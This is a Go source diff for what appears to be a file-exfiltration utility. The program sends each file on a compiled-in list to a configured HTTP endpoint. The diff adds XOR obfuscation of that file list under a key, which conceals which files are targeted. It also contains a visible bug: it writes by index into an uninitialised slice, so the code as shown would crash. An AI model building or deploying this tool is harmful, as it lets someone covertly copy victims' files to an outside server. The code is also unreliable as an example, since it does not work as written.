@@ -11,10 +11,13 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	encryption "github.com/ariary/go-utils/pkg/encrypt"
 )
 
 var FileList string
 var Endpoint string
+var Key string
 
 var usage string
 
@@ -29,24 +32,27 @@ func main() {
 	flag.Usage = func() { fmt.Print(usage) }
 	flag.Parse()
 
-	//unflat file list
-	sFileList := strings.Split(FileList, "\n")
-
+	//unflat file list + decrypt
+	encFileList := strings.Split(FileList, "\n")
+	var fileList []string
 	if debug {
 		fmt.Println("files:")
-		for i := 0; i < len(sFileList); i++ {
-			fmt.Println(sFileList[i])
-		}
-
-		fmt.Println("endpoint:", Endpoint)
 	}
+	for i := 0; i < len(encFileList); i++ {
+		fileList[i] = encryption.Xor(encFileList[i], Key)
+		if debug {
+			fmt.Println(fileList[i])
+		}
+	}
+
+	fmt.Println("endpoint:", Endpoint)
 
 	// send file
 	client := &http.Client{}
-	for i := 0; i < len(sFileList); i++ {
-		err := SendFile(client, Endpoint, sFileList[i])
+	for i := 0; i < len(fileList); i++ {
+		err := SendFile(client, Endpoint, fileList[i])
 		if err != nil && debug {
-			fmt.Println(sFileList[i])
+			fmt.Println(fileList[i])
 			fmt.Println("error:", err)
 		}
 	}
